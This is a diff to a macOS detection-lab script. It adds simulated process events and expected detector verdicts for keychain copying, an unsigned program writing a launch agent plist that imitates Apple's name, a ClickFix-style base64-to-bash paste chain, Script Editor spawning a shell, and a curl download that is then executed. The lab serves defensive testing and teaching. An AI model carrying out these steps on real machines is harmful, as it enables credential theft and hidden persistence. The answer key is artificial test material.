@@ -345,6 +345,11 @@ run() {
 #   45  launchd starts a vendor daemon that runs as root with the user's effective id: dropped privileges, context
 #   46  a standalone launch agent for an updater app, no process tied to it
 #   50..53  a second shell runs sw_vers, uname -a, system_profiler: a recon burst
+#   80  zsh: cp of the login keychain into /tmp/lab
+#   85  zsh: an unsigned program from /Users/Shared writes a launch agent plist named com.apple.…
+#   90  a second shell: base64 -d, and a bash reading from a pipe a second later: a pasted command
+#   95  launchd starts Script Editor, which runs a shell
+#  100  zsh: curl -o writes an ad-hoc program into /tmp/lab, which runs a second later
 synthetic_story() {
   answer_header
   local LAUNCHD TERMINAL LOGIN ZSH MONITOR NOTES TERMINAL2 ZSH2 SHELL2 bash curl agent sub sl daemon c
@@ -483,6 +488,44 @@ synthetic_story() {
   ev_exit 60.0 "$bash"
   ev_exit 70.0 "$sl"
   answer orphan orphaned low queued 'sleep 600' 'Its parent exited, so it now sits under launchd: the double fork that detaches a process.'
+
+  # 9. The learner's shell copies the login keychain into the staging folder.
+  ev_fork 80.0 "$ZSH" 7610 9610; c=$LAST
+  ev_exec 80.1 "$c" /bin/cp platform com.apple.cp '' "$CWD" tty cp /Users/learner/Library/Keychains/login.keychain-db /tmp/lab/login.keychain-db
+  ev_create 80.2 "$c" "$LAB/login.keychain-db"
+  ev_exit 80.3 "$c"
+  answer keychain-copy credential-store-copy high queued 'Keychains/login.keychain-db' 'The login keychain copied into a temporary folder: stealers stage it there before uploading.'
+
+  # 10. An unsigned program writes a launch agent plist that wears Apple's name.
+  ev_fork 85.0 "$ZSH" 7620 9620; c=$LAST
+  ev_exec 85.1 "$c" /Users/Shared/Softwareupdate/helper unsigned '' '' "$CWD" tty helper --install com.apple.softwareupdate.helper
+  ev_create 85.2 "$c" "$AGENTS/com.apple.softwareupdate.helper.plist"
+  ev_exit 85.3 "$c"
+  answer masquerade apple-masquerade high queued '--install com.apple.softwareupdate.helper' 'An unsigned program writes a launch agent plist named like Apple'"'"'s: the persistence looks like part of macOS.'
+
+  # 11. A pasted command in the second shell: a decoder, then a bash that reads from a pipe, a second apart.
+  ev_fork 90.0 "$ZSH2" 7630 9630; c=$LAST
+  ev_fork 90.0 "$ZSH2" 7631 9631; bash=$LAST
+  ev_exec 90.1 "$c" /usr/bin/base64 platform com.apple.base64 '' "$CWD" tty base64 -d -i /tmp/lab/paste.b64
+  ev_exit 90.4 "$c"
+  ev_exec 91.1 "$bash" /bin/bash platform com.apple.bash '' "$CWD" pipe bash -l -s
+  ev_exit 91.4 "$bash"
+  answer paste clickfix-paste-chain high queued 'bash -l -s' 'A decoder and a bash reading from a pipe, a second apart under one shell: the line a ClickFix page tells the user to paste.'
+
+  # 12. launchd starts Script Editor, which runs a shell: an app that has no business running commands.
+  ev_fork 95.0 "$LAUNCHD" 7640 9640; c=$LAST
+  ev_exec 95.1 "$c" '/System/Applications/Utilities/Script Editor.app/Contents/MacOS/Script Editor' platform com.apple.ScriptEditor2 '' / tty 'Script Editor'
+  run 95.5 "$c" 7641 9641 /bin/sh sh -c 'echo lab-script-editor'
+  ev_exit 96.0 "$c"
+  answer script-editor risky-parent-spawn high queued 'lab-script-editor' 'Script Editor runs a shell: an app that should not run commands. The same shell also shows shell-under-app.'
+
+  # 13. curl writes a program into the staging folder and the shell runs it a second later.
+  ev_fork 100.0 "$ZSH" 7650 9650; curl=$LAST
+  ev_exec 100.1 "$curl" /usr/bin/curl platform com.apple.curl '' "$CWD" tty curl -sL -o "$LAB/stage2" https://cdn.example.net/stage2
+  ev_create 100.2 "$curl" "$LAB/stage2"
+  ev_exit 100.4 "$curl"
+  run_as 101.1 "$ZSH" 7651 9651 "$LAB/stage2" adhoc stage2-55554944f0be3f1f '' stage2 --run
+  answer dropped dropped-then-executed high queued 'stage2 --run' 'A program written by curl runs a second later from the staging folder, and it is ad-hoc signed: fetch, then run.'
 }
 
 # ---- live mode --------------------------------------------------------------------------------------------------
@@ -504,6 +547,10 @@ live_answers() {
     '#   security-setting-change med, and the spctl, networksetup and certificate forms: an admin account may' \
     '#     succeed, or get a password prompt. Only csrutil, which refuses outside Recovery, runs.' \
     '#   keychain-access med and low: the lab makes one keychain call, for an item that does not exist.' \
+    '#   credential-store-copy: the lab will not copy the real keychain or a browser'"'"'s password database.' \
+    '#   apple-masquerade: the lab will not write a com.apple launch plist, and an unsigned program will not run.' \
+    '#   clickfix-paste-chain: the lab will not fetch with curl -k or a custom user agent, or run what it decodes.' \
+    '#   risky-parent-spawn for Script Editor, Office and developer tools: the lab opens none of them (only its applet).' \
     '#   persistence-item med on its own row: needs an app'"'"'s own launch agent.' >&4
   answer download download med queued 'file:///etc/hosts' 'curl saves a file to disk (from /etc/hosts, so no network is used).'
   answer pipe shell-from-pipe med queued 'bash -s' 'bash runs commands piped into it: no script file on disk to inspect.'
@@ -518,7 +565,10 @@ live_answers() {
   answer script-file osascript-script med queued 'collect.applescript' 'osascript runs a script file from /tmp.'
   answer odd-binary odd-location-exec high queued '/agent --lab' 'An ad-hoc signed copy of /usr/bin/true running from /tmp.'
   answer odd-binary adhoc low queued '/agent --lab' 'Ad-hoc signed: no developer identity.'
+  answer odd-binary dropped-then-executed high queued '/agent --lab' 'cp wrote the program and codesign signed it a moment before it ran from /tmp, and it is ad-hoc signed.'
+  answer app-shell dropped-then-executed high queued 'Lab Helper.app/Contents/MacOS/applet' 'osacompile wrote the applet and the lab ran it at once from /tmp; it is ad-hoc signed (a row for the applet process itself, not its shell).'
   answer app-shell shell-under-app med queued 'echo ficus-lab-applet' 'An AppleScript applet (an app) runs a shell with do shell script.'
+  answer app-shell risky-parent-spawn high queued 'echo ficus-lab-applet' 'The same applet shell, seen as an app that should not run commands.'
   answer orphan orphaned low queued 'sleep 3' 'Its parent exited, so it ends up under launchd.'
   answer persist persistence-item high queued 'agent-template.plist' 'cp writes a launch agent plist into ~/Library/LaunchAgents (removed at the end) and macOS registers it; it runs a shell, so it is high. macOS likely shows a "Background Items Added" notification: that is what a real infection looks like too.'
   answer persist-load launchctl-load high queued 'launchctl bootstrap' 'launchctl starts the job now (it only runs "exit 0").'
